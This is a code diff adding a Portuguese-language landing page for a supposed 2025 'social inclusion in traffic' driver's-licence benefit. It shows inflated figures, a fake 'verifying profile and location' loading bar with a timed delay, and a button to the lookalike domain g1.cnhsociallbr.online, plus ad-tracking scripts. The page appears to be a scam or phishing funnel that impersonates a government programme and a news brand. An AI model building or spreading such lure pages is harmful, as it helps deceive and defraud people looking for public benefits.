@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Programa de Mobilidade 2025</title>
+  <meta name="description" content="Informações e requisitos para participar do benefício social de mobilidade em 2025." />
+  <style>
+    :root {
+      --clr-bg: #fdfdfd;
+      --clr-text: #1a1a1a;
+      --clr-muted: #5f6b7a;
+      --clr-card: #ffffff;
+      --clr-card-border: #e0e7ef;
+      --clr-accent: #ff5722;
+      --clr-accent-dark: #e64a19;
+      --clr-ring: rgba(255, 87, 34, 0.12);
+      --shadow-lg: 0 8px 20px rgba(0,0,0,.08);
+      --radius: 18px;
+    }
+
+    * { box-sizing: border-box }
+    html, body { height: 100% }
+    body {
+      margin: 0;
+      font-family: "Roboto", system-ui, -apple-system, Arial, sans-serif;
+      color: var(--clr-text);
+      background: linear-gradient(160deg, #f8fafc 0%, #eef2f7 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    main.container {
+      width: min(960px, 94%);
+      margin: auto;
+      text-align: center;
+      padding: 36px 0 44px;
+    }
+
+    header h1 {
+      font-size: clamp(26px, 4vw, 42px);
+      margin: 0 0 .4rem;
+      font-weight: 800;
+      color: var(--clr-accent-dark);
+    }
+
+    header p.lead {
+      margin: 0 0 1rem;
+      color: var(--clr-muted);
+      font-weight: 500;
+    }
+
+    .caption {
+      margin: 1.4rem 0 1rem;
+      color: var(--clr-muted);
+    }
+
+    .progress-bar-wrapper {
+      width: 180px;
+      height: 8px;
+      background-color: #e0e0e0;
+      border-radius: 4px;
+      overflow: hidden;
+      margin: 0 auto 1.4rem;
+    }
+
+    .progress-bar {
+      width: 0%;
+      height: 100%;
+      background-color: var(--clr-accent-dark);
+      animation: fillBar 3.5s forwards;
+    }
+
+    @keyframes fillBar {
+      to {
+        width: 100%;
+      }
+    }
+
+    /* Cards */
+    .cards {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 16px;
+      margin: 0 auto 2rem;
+    }
+
+    .card {
+      background: var(--clr-card);
+      border: 1px solid var(--clr-card-border);
+      border-radius: var(--radius);
+      padding: 20px 14px;
+      box-shadow: var(--shadow-lg);
+    }
+
+    .kpi {
+      font-weight: 900;
+      font-size: clamp(18px, 2.2vw, 24px);
+      color: var(--clr-accent-dark);
+    }
+
+    .lbl {
+      margin-top: 6px;
+      font-size: 13px;
+      color: var(--clr-muted);
+    }
+
+    /* Botão */
+    .cta {
+      display: inline-block;
+      color: #fff;
+      background-color: var(--clr-accent-dark);
+      padding: 16px 36px;
+      border-radius: 999px;
+      font-weight: 700;
+      text-decoration: none;
+      box-shadow: 0 12px 28px rgba(255,87,34,.35);
+      transition: all .16s ease;
+      font-size: 17px;
+      opacity: 0.5;
+      pointer-events: none;
+      margin: 0 auto;
+    }
+
+    .cta.enabled {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .cta:hover { filter: brightness(1.05); transform: translateY(-2px) }
+    .cta:active { transform: translateY(1px) }
+
+    /* Responsivo */
+    @media (max-width: 720px) {
+      .cards { grid-template-columns: 1fr; gap: 12px; }
+      main.container { padding: 24px 0 32px }
+    }
+  </style>
+
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+
+  <script>
+    window.googlePixelId = "68a6a692522d57ebd1679543";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+    document.head.appendChild(a);
+  </script>
+</head>
+<body>
+  <main class="container">
+    <header>
+      <h1>Inclusão Social no Trânsito 2025</h1>
+      <p class="lead">Ampliando o acesso à direção e autonomia no trânsito</p>
+
+      <!-- Botão entre os textos -->
+      <a class="cta" href="https://g1.cnhsociallbr.online" rel="noopener">Prosseguir</a>
+
+      <p class="caption">Verificando informações de perfil e localidade...</p>
+
+      <!-- Barra de carregamento abaixo do segundo texto -->
+      <div class="progress-bar-wrapper" aria-hidden="true">
+        <div class="progress-bar"></div>
+      </div>
+    </header>
+
+    <section class="cards" aria-label="Dados gerais">
+      <article class="card">
+        <div class="kpi">150 mil+</div>
+        <div class="lbl">Carteiras disponíveis</div>
+      </article>
+      <article class="card">
+        <div class="kpi">5.570</div>
+        <div class="lbl">Municípios atendidos</div>
+      </article>
+      <article class="card">
+        <div class="kpi">27</div>
+        <div class="lbl">Unidades federativas</div>
+      </article>
+    </section>
+
+    <script>
+      // Habilita o botão após 3.5 segundos (barra terminar de encher)
+      setTimeout(() => {
+        const btn = document.querySelector('.cta');
+        btn.classList.add('enabled');
+      }, 3500);
+
+      // Preserva parâmetros da URL no botão
+      (function () {
+        const btn = document.querySelector('.cta');
+        if (btn && location.search) {
+          btn.href += location.search;
+        }
+      })();
+    </script>
+
+  </main>
+</body>
+</html>
